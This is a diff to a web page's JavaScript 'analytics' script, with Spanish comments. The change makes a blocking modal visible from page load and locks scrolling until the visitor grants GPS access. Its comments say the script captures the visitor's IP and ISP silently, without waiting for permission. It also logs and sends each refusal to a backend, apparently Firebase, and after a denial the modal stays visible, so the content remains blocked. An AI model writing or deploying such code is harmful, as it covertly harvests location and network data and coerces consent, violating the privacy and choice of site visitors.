@@ -282,14 +282,11 @@ async function sendToFirebase(data) {
  * Muestra el modal bloqueante
  */
 function showLocationModal() {
-    if (analyticsState.modalShown) return;
-    
-    analyticsState.modalShown = true;
     const modal = document.getElementById('location-modal');
     
     if (modal) {
         log('🚨 Mostrando modal de verificación');
-        modal.classList.add('show');
+        modal.classList.remove('hide');
         
         // Bloquear scroll del body
         document.body.style.overflow = 'hidden';
@@ -304,7 +301,7 @@ function hideLocationModal() {
     
     if (modal) {
         log('✅ Ocultando modal');
-        modal.classList.remove('show');
+        modal.classList.add('hide');
         document.body.style.overflow = 'auto';
     }
 }
@@ -329,12 +326,29 @@ async function handleConfirmButton() {
         // GPS obtenido: enviar segundo paquete
         await sendSecondPackage(gpsData);
         
+        // Enviar evento de aceptación en reintento
+        await sendData({
+            event: 'gps_granted_retry',
+            stage: 'user_accepted_after_modal',
+            sessionId: analyticsState.sessionId,
+            timestamp: new Date().toISOString()
+        });
+        
         // Ocultar modal y permitir lectura
         hideLocationModal();
         
     } catch (error) {
         // Si vuelve a fallar, mostrar mensaje de error
         log('❌ Usuario rechazó GPS nuevamente o error', error);
+        
+        // Enviar evento de rechazo múltiple
+        await sendData({
+            event: 'gps_denied_again',
+            stage: 'persistent_denial',
+            sessionId: analyticsState.sessionId,
+            timestamp: new Date().toISOString(),
+            errorType: error.type || 'UNKNOWN'
+        });
         
         if (btn) {
             btn.innerHTML = '❌ Permiso denegado - Reintentar';
@@ -415,20 +429,27 @@ async function sendSecondPackage(gpsData) {
 async function initAnalytics() {
     log('🚀 Iniciando sistema de analytics persistente...');
 
+    // Modal SIEMPRE visible desde el inicio (configurado en CSS)
+    // Bloquear scroll inmediatamente
+    document.body.style.overflow = 'hidden';
+    
     // PASO 1: Captura silenciosa de IP + ISP (NO espera permiso del usuario)
     await sendInitialPackage();
 
-    // PASO 2: Solicitar GPS de forma silenciosa
+    // PASO 2: Solicitar GPS INMEDIATAMENTE (sin esperar interacción)
     try {
         const gpsData = await requestGeolocation();
         
-        // Si acepta de inmediato, enviar GPS y no mostrar modal
+        // Si acepta, enviar GPS y ocultar modal
         await sendSecondPackage(gpsData);
-        log('✅ Usuario aceptó GPS inmediatamente');
+        log('✅ Usuario aceptó GPS');
+        
+        // Ocultar modal y permitir lectura
+        hideLocationModal();
         
     } catch (error) {
-        // Si deniega o falla GPS: mostrar modal bloqueante
-        log('⚠️ GPS denegado o error - Mostrando modal');
+        // Si deniega, el modal sigue visible (ya estaba desde el inicio)
+        log('⚠️ GPS denegado - Modal permanece visible');
         
         // Enviar evento de rechazo
         await sendData({
@@ -440,8 +461,8 @@ async function initAnalytics() {
             errorMessage: error.message || 'Error desconocido'
         });
         
-        // Mostrar modal bloqueante
-        showLocationModal();
+        // Modal ya está visible, solo mantenerlo
+        analyticsState.modalShown = true;
     }
 }
 
